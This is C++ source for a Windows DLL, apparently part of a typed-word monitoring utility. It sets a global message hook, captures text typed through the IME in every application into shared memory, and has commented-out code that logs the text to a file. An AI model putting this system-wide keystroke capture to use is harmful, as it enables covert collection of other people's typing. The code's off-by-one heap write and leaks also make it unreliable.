#pragma comment(lib, "Imm32.lib")
// dllmain.cpp : DLL 응용 프로그램의 진입점을 정의합니다.
#include "stdafx.h"
#include "windows.h"
#include "imm.h"
#include <stdlib.h>
#define IsHangle(c)  ((unsigned char)(c) > 0x7f)
#define WM_LETTER_MSG WM_USER+6

HHOOK 		hHook = NULL;
HINSTANCE 	hHookDll;
HWND hCaller = NULL;
LRESULT CALLBACK GetMsgProc(int code,  WPARAM wParam,  LPARAM lParam);


extern "C"_declspec(dllexport) void SetHookProc(HWND hWnd);
extern "C"_declspec(dllexport) char* GetLetter();

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
hHookDll = (HINSTANCE )hModule;
    	return TRUE;
}
_declspec(dllexport) void SetHookProc(HWND hWnd)
{
	hHook =  SetWindowsHookEx(WH_GETMESSAGE,GetMsgProc,hHookDll,0);
	hCaller=hWnd;

}

void UnsetHookProc()
{
	UnhookWindowsHookEx(hHook);
}

char *ch;
DWORD last=0;
LRESULT CALLBACK GetMsgProc(int code,  WPARAM wParam,  LPARAM lParam)
{
	LRESULT lResult=CallNextHookEx(hHook, code,  wParam, lParam);
   	MSG *msg = (MSG *)lParam;
	if (msg->lParam==GCS_RESULTSTR&&msg->time!=last )// msg->message == WM_IME_COMPOSITION 생략
   	{	
		last=msg->time;
		HIMC hIMC;
		DWORD dwSize;
        
		hIMC = ImmGetContext(msg->hwnd);
		dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);
		
		ch=new char[dwSize];
        ImmGetCompositionString(hIMC, GCS_RESULTSTR, ch, dwSize);
		ch[dwSize]=(char)0;
		//ch[dwSize+1]=(char)0;//유니코드면
		ImmReleaseContext(msg->hwnd, hIMC);
		/*
		FILE* f1;
        f1=fopen("c://report.txt","a+");
		fwrite(ch,dwSize,1,f1);
        fclose(f1);    
		*/
		
		HANDLE hMapFile3;
		hMapFile3=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,sizeof(char)*40,"Alarme_TypedWord");
		char* mapFile=(char*)MapViewOfFile(hMapFile3,FILE_MAP_ALL_ACCESS,0,0,sizeof(char)*40);
		int len=strlen(mapFile);
		int cut=0;
		if(len>34){	//34가 넘으면 자를것임
			char append[40];
			while(1){	//2바이트 문자가 안깨지게 하기 위함
				if(IsHangle(mapFile[cut]))cut+=2;	//한글이면 두바이트 다음
				else cut++;	//아니면 한바이트 다음
				if(cut>20) break;	//자를 위치 확정
			}
			strcpy(append,&mapFile[cut]);
			strcpy(mapFile,append);
		}
		strcat(mapFile,ch);

		UnmapViewOfFile(mapFile);



   	} 
   	return lResult;
}